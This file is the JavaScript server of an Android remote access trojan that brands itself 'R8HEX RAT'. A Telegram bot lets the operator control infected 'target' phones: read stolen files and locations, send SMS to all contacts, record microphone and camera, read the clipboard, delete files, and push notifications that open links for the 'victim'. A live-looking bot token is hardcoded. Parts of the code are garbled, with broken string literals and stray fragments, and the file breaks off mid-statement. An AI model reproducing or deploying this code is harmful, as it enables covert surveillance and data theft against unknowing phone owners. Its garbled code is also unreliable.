const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7650535339:AAEdX_ws3531pixzaPofbUKYvzAuZp39cVE'
const id = '7125184791'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝐒𝐞𝐫𝐯𝐞𝐫 𝐮𝐩𝐥𝐨𝐚𝐝𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝐌𝐚𝐬𝐬𝐚𝐠𝐞 𝐅𝐨𝐫𝐦 <b>${req.headers.model}</b> 𝐝𝐞𝐯𝐢𝐜𝐞`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝐌𝐚𝐬𝐬𝐚𝐠𝐞 𝐅𝐨𝐫𝐦 <b>${req.headers.model}</b> 𝐝𝐞𝐯𝐢𝐜𝐞\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫𝐦<b>${req.headers.model}</b> 𝐝𝐞𝐯𝐢𝐜𝐞`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
       °• 𝐇𝐮𝐫𝐫𝐚𝐡... 𝐀 𝐍𝐞𝐰 𝐓𝐚𝐫𝐠𝐞𝐭 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 

• 𝐃𝐞𝐯𝐢𝐜𝐞 𝐌𝐨𝐝𝐞𝐥 : • : <b>${model}</b>\n

• 𝐁𝐚𝐭𝐭𝐚𝐫𝐲 : • : <b>${battery}</b>\n 

• 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : • : <b>${version}</b>\n
 
• 𝐁𝐫𝐢𝐠𝐡𝐭𝐧𝐞𝐬𝐬 𝐋𝐞𝐯𝐞𝐥 : •: <b>${brightness}</b>\n
1
 
• 𝐒𝐢𝐦 : • ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
         °• 𝐎𝐨𝐩𝐬 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 

• 𝐃𝐞𝐯𝐢𝐜𝐞 𝐌𝐨𝐝𝐞𝐥 : • : <b>${model}</b>\n

• 𝐁𝐚𝐭𝐭𝐚𝐫𝐲 : • : <b>${battery}</b>\n 

• 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : • : <b>${version}</b>\n

• 𝐁𝐫𝐢𝐠𝐡𝐭𝐧𝐞𝐬𝐬 𝐋𝐞𝐯𝐞𝐥 : •: <b>${brightness}</b>\n
1

• 𝐒𝐢𝐦 : • ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐢𝐬 𝐨𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐢𝐬 𝐨𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐢𝐬 𝐨𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐢𝐬 𝐨𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐬𝐭 𝐢𝐬 𝐨𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  °• 𝐍𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞..\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝐖𝐄𝐋𝐂𝐎𝐌𝐑 𝐓𝐎 𝐑8𝐇𝐄𝐗 𝐑𝐀𝐓 𝐇𝐀𝐂𝐊𝐈𝐍𝐆 𝐎𝐖𝐍𝐄𝐑= @𝐉𝐀𝐋𝐋𝐀𝐃𝐱𝐁𝐀𝐀𝐏\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• °• 𝐍𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞..\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°•°• 𝐋𝐢𝐬𝐭 𝐎𝐟 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐃𝐞𝐯𝐢𝐜𝐞... ::\n\n'
                appClients.forEach(function (value, key, map) {

• 𝐃𝐞𝐯𝐢𝐜𝐞 𝐌𝐨𝐝𝐞𝐥 : <b>${value.model}</b>\n

• 𝐁𝐚𝐭𝐭𝐞𝐫𝐲 •  : <b>${value.battery}</b>\n
• 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : <b>${value.version}</b>\n)
 
• 𝐒𝐜𝐫𝐞𝐞𝐧 𝐁𝐫𝐢𝐠𝐡𝐭𝐧𝐞𝐬𝐬 :  <b>${value.brightness}</b>\n
1
 
• 𝐒𝐢𝐦 : • ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n
ue5G
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• °• 𝐍𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞..\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝐀𝐩𝐩𝐬', callback_data: `apps:${uuid}`},
                        {text: '𝐃𝐞𝐯𝐢𝐜𝐞 𝐢𝐧𝐟𝐨', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝐆𝐞𝐭 𝐟𝐢𝐥𝐞', callback_data: `file:${uuid}`},
                        {text: '𝐝𝐞𝐥𝐞𝐭𝐞 𝐟𝐢𝐥𝐞', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝐂𝐥𝐢𝐩 𝐛𝐨𝐚𝐫𝐝', callback_data: `clipboard:${uuid}`},
                        {text: '𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞', callback_data: `microphone:${uuid}`},
                    ],
                    [
